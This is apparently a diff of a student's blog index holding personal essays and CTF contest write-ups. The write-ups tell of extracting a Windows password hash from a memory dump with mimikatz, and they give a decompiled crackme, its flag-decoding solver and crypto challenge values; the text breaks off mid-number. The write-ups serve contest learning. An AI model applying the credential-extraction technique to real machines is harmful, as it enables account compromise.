-    <title>Twenty-four——my summary of year 2021</title>
-    <url>/2021/12/30/bye2021.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>The year 2021 is another extraordinary year for me. Many shining and gloomy moments happened. To sum up, I still believe my year of 2021 goes smoothly.</p>
-<p><img src="/2021/12/30/bye2021/2021.png"></p>
-<span id="more"></span> 
-<p>The year of 2021 started with disappointment of AFO and frustration of failing in the monthly examination. I knew this was a crux of my life because there were only 5 months left before gaokao but I still had a bunch of things to master. My goal was to reach 600, and I had to prepare for OI, CTF for self-enrollment exam, attend classes and review those unfamiliar knowledge before simultaneously. It’s a very tough work, like walking in the darkness while looking for the correct path myself. The only joyful thing in my “senior 3” was playing table-tennis and taking photos in snowy days after the academic proficiency test ended.</p>
-<p>In winter vacation, to help go through courses I’ve learnt and forgotten in senior 1, I asked my parents to find “one to one” tutoring for my physics and chemistry. Surely I recovered what I learned before and I’ve got a lot of practical skills for exam, but more importantly, my physics tutor told me the prospect of computer science and asked me to work hard on it. I was motivated by him and put more attention to self-enrollment.</p>
-<p>By the end of March, my hard work in CTF has paid off and I succeeded in self-enrollment exam by scu. It’s the first and huge progress I’ve made this year. After the exam, my task became much simpler. I just need to focus on gaokao and got a high score instead.</p>
-<p>Time passed quickly and gaokao finally arrived in a glimpse. Although the difficulty of natural science has raised, I still got a fairly high score in math. However, I messed up in physics and chemistry, which made the overall score just a little more than 600. There were some classmates attending gaokao <strong>in senior 2 with me</strong> and the best score was about 670, but I don’t care. All in all, 605 is still a highlight for student who only takes classes for about one year. </p>
-<blockquote>
-<p>After gaokao, my mother told me that she was diagnosed with lung cancer when I was having a self-enrollment. But luckily, it was an early stage and can be cured by an operation. Also, she had an insurance and got paid a lot of money, which was far more than the fare of operation. Say, this was the unexpected fortune. What depressed my family was she indulged in <del>investment</del> lottery and took no notice of my advice of quitting. When she realized this was a fraud, she had lost all of the “unexpected fortune”.</p>
-</blockquote>
-<p>The life in summer vacation wasn’t as easy as I thought before. I had to learn calculus, linear algebra and got a driving license in only 2 months. I couldn’t imagine how I managed to handle these but I still worked them out. Also, I played <em>Mystery Lover</em> recommended by Hash and developed an interest in Touhou (although I don’t plan to play the game because it’s too time-consuming), yandere (like Yuno) and music games. These games, anime and music took me into another idealized world apart from the cruel reality. Say, another habitat for my heart.</p>
-<p>By the time I entered university, I firstly felt all the surroundings are fresh and we have plenty of time to what I want. Then I realized that self-control is impressively significant in campus life now, which can make you distinctive or degenerate. So I continued to learn with the strength of senior high. Then in a CTF competition nationwide, we ranked 4th in 24 participants, winning the glory of our university <del>and high school</del>.</p>
-<p>However in the mid-term exam, I didn’t do a very good job in calculus, just a little more than 60 again. Also, the freshness of campus life has vanished, I gradually found that there are many unnecessary tasks you have to do and boresome courses you have to take. That made me kind of annoyed. Sometimes I even doubted if the path I chose is my dream and lost in thought. </p>
-<blockquote>
-<p>To seek the meaning of my campus life and look for way to achieve my dream, I watched <em>CLANNAD</em> and also played the game. Although I didn’t find the answer to my current situation, I truly felt a different kind of warmth. I was moved by the grand redefinition of “FAMILY” and the growth and maturity of Okazaki couple. Till now, the plots and scenarios still reverberate in my heart.</p>
-</blockquote>
-<p>When the security project comes in late November and December, some classmates asked me questions about pointers, stack overflow and reverse engineering. So, I posted some blogs, trying to explain these knowledge in a friendly way. While teaching others, I also have a deeper understanding of these principle by manipulating over and over again. And step by step I’ve felt the charm of my major and I’m not as bewildered as before. So I’m starting to learn <em>CSAPP</em> and <em>encryption and decryption</em> on my own during spare time to enrich my academic ability.</p>
-<p>Hoping I will get good grades in calculus and linear algebra, and learn more practical skills in the next year 2022!  </p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>twenty-five——bye, Baidu</title>
-    <url>/2022/04/15/bye_baidu.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>My English presentation on 4/14/2022.</p>
-<p><img src="/2022/04/15/bye_baidu/1.png"></p>
-<span id="more"></span>
-<p><img src="/2022/04/15/bye_baidu/2.png"></p>
-<p>Baidu, the largest search engine provider in China, was found in millennium. Owing to deep understanding of habits from native users, Baidu beat its opponent Google successfully. What’s more, deeply integrated with other services, such as Baidu Encyclopedia, Baidu Post Bar, Baidu Knows, Baidu Netdisk, Baidu improved user stickiness. In recent years, with the development of mobile-tech, Baidu created a column named Baijiahao. Through using mobile apps, Baidu gains a lot of user traffic, while making much profit.</p>
-<p><img src="/2022/04/15/bye_baidu/3.png"></p>
-<p><img src="/2022/04/15/bye_baidu/4.png"></p>
-<p>The first reason to refuse Baidu is that there are too much distraction. One of the most obvious factors is the advertisement. Look at this picture, when you input keywords relating to “diseases”, “education” or goods”, Baidu will return a whole page of noisome ads, which wastes your time. Moreover, some fake ads may mislead you and cause some loss.</p>
-<p><img src="/2022/04/15/bye_baidu/5.png"></p>
-<p>Apart from disgusting ads, the search result pages of Baidu are too complex. There are too many unnecessary items. For example, when you type “games” in Baidu, the recommendation on the right is so vulgar that they can’t even be called as “games”.</p>
-<p><img src="/2022/04/15/bye_baidu/6.png"></p>
-<p>The profusion of webpage is also the nightmare of minimalists. This is a new tab from my browser. Looks very simple, huh?</p>
-<p><img src="/2022/04/15/bye_baidu/7.png"></p>
-<p>This is Google. It’s also very suitable for minimalists.</p>
-<p><img src="/2022/04/15/bye_baidu/8.png"></p>
-<p>This is Bing. It looks beautiful and even better.</p>
-<p><img src="/2022/04/15/bye_baidu/9.png"></p>
-<p>And this is Baidu… Most of the time, if you click one of these links, you’ll watch videos or read news one after another——and after half or one hour later, you will return to the start and totally forget what you want to search in the beginning.</p>
-<p><img src="/2022/04/15/bye_baidu/10.png"></p>
-<p>The second reason is useless search result for some keywords. Baidu only takes root in the Chinese market, so it’s unsuitable to search items that are heavily associated with English. </p>
-<p><img src="/2022/04/15/bye_baidu/11.png"></p>
-<p>In professional fields, like mathematics, when you type “de rham cohomology”, you can get a link to Wikipedia. However in Baidu, the first search result is just the Chinese translation. I believe people who search this are eager to find its definition and explanation, not just the Chinese translation.</p>
-<p><img src="/2022/04/15/bye_baidu/12.png"></p>
-<p><img src="/2022/04/15/bye_baidu/13.png"></p>
-<p>My roommate is a sports fan and he often follows sports stars’ activities. Baidu lacks information of foreign culture like sports. When he tried to look up “juju” in Google, it returns his Instagram, wiki and so on. On the other side, he typed the same word in Baidu, he can only receive a female Japanese singer and other unrelated info.</p>
-<p><img src="/2022/04/15/bye_baidu/14.png"></p>
-<p><img src="/2022/04/15/bye_baidu/15.png"></p>
-<p>Another reason not to be ignored is its vile business model. If you use your mobile browser to search in Baidu.com, or click other related searches, you’ll receive a pop-up which asks to download their app. This action degrades the user experience and makes some mobile users reluctantly install Baidu app——of course not including me.</p>
-<p>Another solid proof is the speed restriction policy of Baidu Netdisk. At the beginning when Baidu Netdisk was found, it generously gives users 2048 gigabytes of disk space. Actually this is a good scheme to accumulate users. When there are enough (i.e. pretty much) users, Baidu starts to restrict the download speed and asks users to upgrade VIP in order to speed up. Because users have already store lots of data, they can’t find any substitute. As a result, they have to pay for Baidu to retrieve their important data.</p>
-<p><img src="/2022/04/15/bye_baidu/16.png"></p>
-<p>It must be said that Baidu still has some advantages. Due to the lack of copyright awareness in Mainland China, you can still find lots of pirated software in Baidu. By the way, it’s also a good choice to look for pornography in Baidu.</p>
-<p>All in all, as college students, to save time and find more refined information, let’s say “goodbye” to Baidu and user other search engines together. Thanks for your listening!</p>
-<p><img src="/2022/04/15/bye_baidu/17.png"></p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Twenty-three——review of CLANNAD (anime)</title>
     <url>/2021/11/17/clannad.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Followed by my last English post “bewilderment”, I’m thrilling to find the right path to go on. I suddenly realized that during my high school times, one of my roommates recommended me to watch CLANNAD (short for CL later). I refused for overwhelming pressure several months before college entrance examination. But now I’m free but depressed, I think it’s just the time to watch it in order to guide my heart. </p>
@@ -677,61 +677,6 @@
         <tag>web</tag>
         <tag>pwn</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>陇剑杯入土记</title>
-    <url>/2021/09/14/ctf01.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>刚进校不久，我们就被老师鼓励去打首届陇剑杯，当我看到比赛说明的考纲范围时，就发现考察范围与我学习的知识毫无交集。</p>
-<span id="more"></span>
-<p>结果让我没想到的是，赛题居然比我想象的还要离谱。比赛时间从上午10点到下午6点，8个小时，我就只做出来3道题，而且分值都不高。</p>
-<p>最神奇的是我好不容易找到一个高分值的题目，读取了内存文件，通过网上的工具搞到了系统密码的哈希值，然后死也解不出原文，光这点尝试就花了我两三个小时，在得到答案前的最后一步江郎才尽。</p>
-<p>最后成绩出来，yyx1080分，yjp310分，我280分，我又自闭了。只不过战队总分排位838名，总共有3020名，我们占前30%，还是一个尚可的成绩。</p>
-<h1 id="本队的WriteUp"><a href="#本队的WriteUp" class="headerlink" title="本队的WriteUp"></a>本队的WriteUp</h1><p><img src="/2021/09/14/ctf01/a.jpg"></p>
-<p><img src="/2021/09/14/ctf01/b.jpg"></p>
-<p><img src="/2021/09/14/ctf01/c.jpg"></p>
-<p><img src="/2021/09/14/ctf01/d.jpg"></p>
-<p><img src="/2021/09/14/ctf01/e.jpg"></p>
-<p><img src="/2021/09/14/ctf01/f.jpg"></p>
-<p><img src="/2021/09/14/ctf01/g.jpg"></p>
-<p><img src="/2021/09/14/ctf01/h.jpg"></p>
-<p><img src="/2021/09/14/ctf01/i.jpg"></p>
-<p><img src="/2021/09/14/ctf01/j.jpg"></p>
-<p><img src="/2021/09/14/ctf01/k.jpg"></p>
-<p><img src="/2021/09/14/ctf01/l.jpg"></p>
-<p><img src="/2021/09/14/ctf01/m.jpg"></p>
-<p><img src="/2021/09/14/ctf01/n.jpg"></p>
-<p><img src="/2021/09/14/ctf01/o.jpg"></p>
-<p><img src="/2021/09/14/ctf01/p.jpg"></p>
-<p><img src="/2021/09/14/ctf01/q.jpg"></p>
-<h1 id="updated-on-9，25"><a href="#updated-on-9，25" class="headerlink" title="updated on 9，25"></a>updated on 9，25</h1><p>今天去看了内存第一题的wp，然后我发现有一份的wp得到哈希值后，就马上把flag搬了出来。<del>（原来我与200pts的距离似乎这样近，又似乎那么远……)</del>因为那个flag比较长，又不是很正常的单词，用彩虹表基本上不可能。由此我判断：</p>
-<p><img src="/2021/09/14/ctf01/r.jpg"></p>
-<p><strong>这个wp一定是假wp，该队肯定跟其他队有py交易！</strong>（想打别人一拳.jpg）</p>
-<p>然后我又找到了一个正常的wp，发现<strong>我使用了一模一样的工具，但是却采用了所有的错误方法</strong>，完美绕过了正确答案。</p>
-<p><a href="https://www.jianshu.com/p/7c0bea9ff458">https://www.jianshu.com/p/7c0bea9ff458</a></p>
-<p><img src="/2021/09/14/ctf01/s.png"></p>
-<p><img src="/2021/09/14/ctf01/t.png"></p>
-<p><img src="/2021/09/14/ctf01/u.png"></p>
-<p>此刻我的内心就像这样：</p>
-<blockquote>
-<p>比赛时用mimikatz本体<strong>疯狂报错</strong>，麻了。<strong>win10，我的垃圾</strong></p>
-<p>…………</p>
-</blockquote>
-<h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>&gt;</p>
-<blockquote>
-<p>比赛前:</p>
-<p>宣传！规模！代言！历史上CTF之巅峰！NB!</p>
-<p><img src="https://pic2.zhimg.com/50/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"></p>
-<p>比赛后:</p>
-<p>比赛办的好啊，会办能不能多办点啊，我好多兄弟代打钱还没赚够呢！比赛结束前5分钟11，5分钟后50+是，牛啊牛啊，这比赛怎么会有py是吧，都是企业自己的努力呀！</p>
-<p><img src="https://pic1.zhimg.com/50/v2-137ace222ee43a40c2f04d7d2f9b394d_720w.jpg?source=1940ef5c" alt="img"></p>
-<p>这比赛可办的太好啦！我真谢谢你主办方啊，推动了整个ctf圈子的良好习俗之PY(此PY非比PY，自己体会)风气的成长，将PY产业化，更加符合法律法规，建议加大力度，继续保持，直接推动社会经济文化的发展！</p>
-<p>另外赛题也令人耳目一新！尤其是里面的选择题！立案深刻，十分符合我国当代社会主义核心价值观！要不是你不说16:00不做，有多少战队要措施错失了明明有全部答案但是不能交的苦恼，真的是民心所望，办比赛办到人民心坎里啦！我替国家和人民谢谢你呀！</p>
-<p><a href="https://www.zhihu.com/question/486768971/answer/2120838902">https://www.zhihu.com/question/486768971/answer/2120838902</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
   </entry>
   <entry>
     <title>（近期不更新）csapp学习笔记</title>
@@ -879,6 +824,124 @@
       </categories>
   </entry>
   <entry>
+    <title>陇剑杯入土记</title>
+    <url>/2021/09/14/ctf01.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>刚进校不久，我们就被老师鼓励去打首届陇剑杯，当我看到比赛说明的考纲范围时，就发现考察范围与我学习的知识毫无交集。</p>
+<span id="more"></span>
+<p>结果让我没想到的是，赛题居然比我想象的还要离谱。比赛时间从上午10点到下午6点，8个小时，我就只做出来3道题，而且分值都不高。</p>
+<p>最神奇的是我好不容易找到一个高分值的题目，读取了内存文件，通过网上的工具搞到了系统密码的哈希值，然后死也解不出原文，光这点尝试就花了我两三个小时，在得到答案前的最后一步江郎才尽。</p>
+<p>最后成绩出来，yyx1080分，yjp310分，我280分，我又自闭了。只不过战队总分排位838名，总共有3020名，我们占前30%，还是一个尚可的成绩。</p>
+<h1 id="本队的WriteUp"><a href="#本队的WriteUp" class="headerlink" title="本队的WriteUp"></a>本队的WriteUp</h1><p><img src="/2021/09/14/ctf01/a.jpg"></p>
+<p><img src="/2021/09/14/ctf01/b.jpg"></p>
+<p><img src="/2021/09/14/ctf01/c.jpg"></p>
+<p><img src="/2021/09/14/ctf01/d.jpg"></p>
+<p><img src="/2021/09/14/ctf01/e.jpg"></p>
+<p><img src="/2021/09/14/ctf01/f.jpg"></p>
+<p><img src="/2021/09/14/ctf01/g.jpg"></p>
+<p><img src="/2021/09/14/ctf01/h.jpg"></p>
+<p><img src="/2021/09/14/ctf01/i.jpg"></p>
+<p><img src="/2021/09/14/ctf01/j.jpg"></p>
+<p><img src="/2021/09/14/ctf01/k.jpg"></p>
+<p><img src="/2021/09/14/ctf01/l.jpg"></p>
+<p><img src="/2021/09/14/ctf01/m.jpg"></p>
+<p><img src="/2021/09/14/ctf01/n.jpg"></p>
+<p><img src="/2021/09/14/ctf01/o.jpg"></p>
+<p><img src="/2021/09/14/ctf01/p.jpg"></p>
+<p><img src="/2021/09/14/ctf01/q.jpg"></p>
+<h1 id="updated-on-9，25"><a href="#updated-on-9，25" class="headerlink" title="updated on 9，25"></a>updated on 9，25</h1><p>今天去看了内存第一题的wp，然后我发现有一份的wp得到哈希值后，就马上把flag搬了出来。<del>（原来我与200pts的距离似乎这样近，又似乎那么远……)</del>因为那个flag比较长，又不是很正常的单词，用彩虹表基本上不可能。由此我判断：</p>
+<p><img src="/2021/09/14/ctf01/r.jpg"></p>
+<p><strong>这个wp一定是假wp，该队肯定跟其他队有py交易！</strong>（想打别人一拳.jpg）</p>
+<p>然后我又找到了一个正常的wp，发现<strong>我使用了一模一样的工具，但是却采用了所有的错误方法</strong>，完美绕过了正确答案。</p>
+<p><a href="https://www.jianshu.com/p/7c0bea9ff458">https://www.jianshu.com/p/7c0bea9ff458</a></p>
+<p><img src="/2021/09/14/ctf01/s.png"></p>
+<p><img src="/2021/09/14/ctf01/t.png"></p>
+<p><img src="/2021/09/14/ctf01/u.png"></p>
+<p>此刻我的内心就像这样：</p>
+<blockquote>
+<p>比赛时用mimikatz本体<strong>疯狂报错</strong>，麻了。<strong>win10，我的垃圾</strong></p>
+<p>…………</p>
+</blockquote>
+<h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>&gt;</p>
+<blockquote>
+<p>比赛前:</p>
+<p>宣传！规模！代言！历史上CTF之巅峰！NB!</p>
+<p><img src="https://pic2.zhimg.com/50/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"></p>
+<p>比赛后:</p>
+<p>比赛办的好啊，会办能不能多办点啊，我好多兄弟代打钱还没赚够呢！比赛结束前5分钟11，5分钟后50+是，牛啊牛啊，这比赛怎么会有py是吧，都是企业自己的努力呀！</p>
+<p><img src="https://pic1.zhimg.com/50/v2-137ace222ee43a40c2f04d7d2f9b394d_720w.jpg?source=1940ef5c" alt="img"></p>
+<p>这比赛可办的太好啦！我真谢谢你主办方啊，推动了整个ctf圈子的良好习俗之PY(此PY非比PY，自己体会)风气的成长，将PY产业化，更加符合法律法规，建议加大力度，继续保持，直接推动社会经济文化的发展！</p>
+<p>另外赛题也令人耳目一新！尤其是里面的选择题！立案深刻，十分符合我国当代社会主义核心价值观！要不是你不说16:00不做，有多少战队要措施错失了明明有全部答案但是不能交的苦恼，真的是民心所望，办比赛办到人民心坎里啦！我替国家和人民谢谢你呀！</p>
+<p><a href="https://www.zhihu.com/question/486768971/answer/2120838902">https://www.zhihu.com/question/486768971/answer/2120838902</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>强网杯出土记</title>
+    <url>/2021/09/25/ctf02.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>经过上次的失败经历后，我相信即将到来的强网杯青少年赛会阳间许多，而事实却并不是这样。</p>
+<p>以下按做题顺序写wp（这次就我一个人做出来题可还行）：</p>
+<span id="more"></span>
+<h2 id="1-签到"><a href="#1-签到" class="headerlink" title="1. 签到"></a>1. 签到</h2><p>打开exe可以直接看到flag（<strong>很开心拿到一血</strong>）</p>
+<p><strong>flag{鲸鱼带你进入鲸奇世界}</strong></p>
+<h2 id="2-Lihua’s-for"><a href="#2-Lihua’s-for" class="headerlink" title="2. Lihua’s for"></a>2. Lihua’s for</h2><p>第一步查壳：</p>
+<p><img src="/2021/09/25/ctf02/a.png"></p>
+<p>第二步打开64位ida，定位到主函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">42</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> a[<span class="number">42</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">42</span>]; <span class="comment">// [rsp+100h] [rbp+80h]</span></span><br><span class="line">  <span class="type">int</span> i_0; <span class="comment">// [rsp+1B4h] [rbp+134h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1B8h] [rbp+138h]</span></span><br><span class="line">  <span class="type">int</span> good; <span class="comment">// [rsp+1BCh] [rbp+13Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  qmemcpy(a, &amp;unk_403040, <span class="keyword">sizeof</span>(a));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input flag&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    b[i] = i ^ flag[i];</span><br><span class="line">  <span class="keyword">for</span> ( i_0 = <span class="number">0</span>; i_0 &lt;= <span class="number">41</span>; ++i_0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a[i_0] != b[i_0] )</span><br><span class="line">    &#123;</span><br><span class="line">      good = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    good = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( good == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;good~&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现程序的原理是将用户输入的flag[i]跟i异或后与a[i]比较。</p>
+<p> 第三步直接把a[i]的值dump出来，编写exp即可解出flag。</p>
+<p> （又水了一道reverse签到题）</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x16</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> t=<span class="number">1</span>;t&lt;<span class="number">255</span>;t++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>((i^t)==a[i*<span class="number">4</span>])</span><br><span class="line">            &#123;cout&lt;&lt;<span class="built_in">char</span>(t);<span class="keyword">break</span>;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>flag{a41be465-a50f-4124-b7ba-2766aff6baf2}</strong></p>
+<h2 id="3-Crypto2"><a href="#3-Crypto2" class="headerlink" title="3. Crypto2"></a>3. Crypto2</h2><p>给定：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1=<span class="number">20663949646446787716947370247427064802032290773674573417491154934657966734874241036307633567695175131014840617208051931753476223149652427133485160771068994073566431652969243962290116898345337189704974833817335135391974497754670322430159624252007005736522065638860351992074099453212550475552692645688800084354832716662142860413158369020005830095049988807931794736876563293916525328174812726514626029103506607813186690909585870115364600969148482617083817273910020722354923244093624032174432568413187131385994452769295894606345768596899824635672699945050103814681553981019917552667794514804359500108947102234376726009329</span></span><br><span class="line">n2=<span class="number">23260834024376640092536888922041147168387702014814910549469730354688848760379274203088716649609675449936234732528778557041701524981200368996310064584479657042098426164366286670115392015865853892816983885530312074073396422301009513106258655315791720535737587913264728919869055970993613641008348186263870234072422880033882864603438907070864271470483691729705421547143623305055532339107777314310976947392833395180922324243244784018964736826235018388498516438612962123562977736924674510730898077787055367234786519915374446506561992135856904927351307275140543635152771670410211235702283822782412971646092584646758107766061</span></span><br><span class="line">c1=<span 